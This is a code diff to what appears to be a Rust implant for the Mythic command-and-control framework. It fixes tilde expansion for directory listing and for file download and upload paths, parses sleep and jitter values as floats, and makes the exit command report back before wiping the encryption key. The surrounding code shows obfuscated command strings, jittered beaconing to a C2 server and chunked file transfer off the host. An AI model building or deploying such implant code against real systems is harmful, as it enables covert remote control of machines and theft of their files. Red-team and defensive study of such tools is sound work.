@@ -42,8 +42,11 @@ pub struct GetTaskingMessage<'a> {
 
 #[derive(serde::Deserialize, Default, Clone)]
 pub struct Task {
+    #[serde(default)]
     pub id: String,
+    #[serde(default)]
     pub command: String,
+    #[serde(default)]
     pub parameters: String,
 }
 
@@ -365,8 +368,20 @@ pub fn extract_param(parameters: &str, key: &str) -> String {
         .unwrap_or_default()
 }
 
+/// Expand a leading `~` to the user's home directory.
+/// Shells expand `~` automatically but std::fs does not.
+pub fn expand_tilde(path: &str) -> String {
+    if path == "~" || path.starts_with("~/") {
+        if let Ok(home) = std::env::var("HOME") {
+            return format!("{}{}", home, &path[1..]);
+        }
+    }
+    path.to_string()
+}
+
 pub fn list_dir(path: &str) -> String {
-    match std::fs::read_dir(path) {
+    let resolved = expand_tilde(path);
+    match std::fs::read_dir(&resolved) {
         Ok(entries) => {
             let mut items: Vec<String> = entries
                 .flatten()
@@ -382,7 +397,7 @@ pub fn list_dir(path: &str) -> String {
             items.sort();
             items.join("\n")
         }
-        Err(e) => format!("[-] {}", e),
+        Err(e) => format!("[-] {}: {}", resolved, e),
     }
 }
 
@@ -612,11 +627,12 @@ pub fn handle_sleep_command(args: &str) -> String {
         );
     }
     let parts: Vec<&str> = args.split_whitespace().collect();
-    if let Ok(s) = parts[0].parse::<u64>() {
-        set_sleep_seconds(s);
+    // Parse as f64 first — Mythic sends NUMBER params as floats (e.g. "5.0")
+    if let Ok(s) = parts[0].parse::<f64>() {
+        set_sleep_seconds(s as u64);
         if parts.len() > 1 {
-            if let Ok(j) = parts[1].parse::<u32>() {
-                set_jitter_percent(j);
+            if let Ok(j) = parts[1].parse::<f64>() {
+                set_jitter_percent(j as u32);
             }
         }
         return format!(
@@ -773,16 +789,25 @@ pub fn run_c2_loop<F>(
         }
 
         let mut responses = Vec::new();
+        let mut should_exit = false;
         for task in &tasks {
             if task.command == "exit" {
-                encryption_key.zeroize();
-                return;
+                responses.push(TaskResponse {
+                    task_id: task.id.clone(),
+                    completed: true,
+                    user_output: Some("[+] exiting".into()),
+                    status: None,
+                    download: None,
+                    upload: None,
+                });
+                should_exit = true;
+                break;
             }
 
             // Download and upload use Mythic's chunked file transfer protocol
             // and require multiple round-trips — handle them outside of dispatch.
             if task.command == obfstr::obfstr!("download") {
-                let path = extract_param(&task.parameters, "path");
+                let path = expand_tilde(&extract_param(&task.parameters, "path"));
                 let output = mythic_download(
                     &client,
                     &base,
@@ -809,7 +834,7 @@ pub fn run_c2_loop<F>(
             }
             if task.command == obfstr::obfstr!("upload") {
                 let file_id = extract_param(&task.parameters, "file");
-                let dest = extract_param(&task.parameters, "remote_path");
+                let dest = expand_tilde(&extract_param(&task.parameters, "remote_path"));
                 let output = mythic_upload(
                     &client,
                     &base,
@@ -864,6 +889,11 @@ pub fn run_c2_loop<F>(
             .post(&format!("{}{}", base, uri))
             .content_type("application/octet-stream")
             .send(&post_msg);
+
+        if should_exit {
+            encryption_key.zeroize();
+            return;
+        }
 
         sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
